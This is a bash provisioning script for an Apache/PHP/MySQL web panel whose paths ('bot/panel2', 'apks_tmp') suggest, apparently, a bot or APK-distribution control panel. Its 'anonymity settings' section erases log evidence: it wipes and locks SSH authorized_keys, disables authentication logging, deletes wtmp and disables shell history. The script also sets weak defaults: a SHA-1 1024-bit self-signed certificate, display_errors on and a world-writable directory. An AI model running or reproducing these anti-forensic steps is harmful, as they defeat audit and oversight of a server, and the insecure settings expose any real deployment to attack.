#!/bin/bash

# server setup
apt-get update
apt-get -y upgrade
apt-get -y install zip unzip vim mc htop mysql-server php5 libapache2-mod-rpaf sudo phpmyadmin mlocate
a2enmod rewrite
a2enmod ssl
a2enmod rpaf

# php
sed -i -r 's/upload_max_filesize = 2M/upload_max_filesize = 100M/' /etc/php5/apache2/php.ini
sed -i -r 's/display_errors = Off/display_errors = On/' /etc/php5/apache2/php.ini
sed -i -r 's/post_max_size = 8M/post_max_size = 100M/' /etc/php5/apache2/php.ini

# apache setup
mkdir /etc/ssl ; cd /etc/ssl/ && openssl req -new -x509 -days 365 -sha1 -newkey rsa:1024 -nodes -keyout server.key -out server.crt -subj '/O=Company/OU=Department/CN=www.example.com'
sed -i -r 's/Include sites-enabled\//Include \/var\/data\/sites-enabled\//' /etc/apache2/apache2.conf
sed -i -r 's/IncludeOptional sites-enabled\/\*.conf/IncludeOptional \/var\/data\/sites-enabled\/\*.conf/' /etc/apache2/apache2.conf

sed -i -r 's/Listen 80/#Listen 80/g' /etc/apache2/ports.conf
sed -i -r 's/Listen 443/#Listen 443/g' /etc/apache2/ports.conf

apachectl restart

# add log dir
mkdir /var/data/ ; mkdir /var/data/logs/ ; chown www-data:root -R /var/data/logs ; chmod 775 /var/data/logs/

# anonymity settings
echo "" > ~/.ssh/authorized_keys ; chattr +i ~/.ssh/authorized_keys ;
sed -i -r 's/auth,authpriv.\*/#auth,authpriv.\*/' /etc/rsyslog.conf ;
service rsyslog restart ;
touch ~/.hushlogin && chattr +i ~/.hushlogin  ;
rm /var/log/wtmp ;
# disable bash history:
#set +o history; history -c ; echo "set +o history" >> ~/.bashrc ; rm ~/.bash_history ;

# set passwords
echo Set basic password for the panel:
read PASS
htpasswd -cb customers.passwd panel2 $PASS

chmod 777 /var/data/www/cp/apks_tmp
chown -R www-data /var/data/www

echo Set db password in /var/data/www/cp/panel/config.php
echo Update include path and password in /var/data/www/bot/panel2/
